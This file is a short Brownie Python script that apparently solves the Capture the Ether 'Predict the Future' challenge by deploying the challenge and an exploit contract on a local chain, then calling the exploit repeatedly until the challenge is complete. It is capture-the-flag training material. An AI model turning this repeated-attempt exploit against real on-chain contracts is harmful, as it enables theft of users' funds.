from brownie import PredictTheFutureChallenge, Ptf_Exploit, accounts, chain


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = PredictTheFutureChallenge.deploy(
        {'from': deployer, 'value': '1 ether'})
    exploit = Ptf_Exploit.deploy(
        contract.address, {'from': player, 'value': '1 ether'})

    while not contract.isComplete():
        exploit.exploit()

    assert contract.isComplete() == True
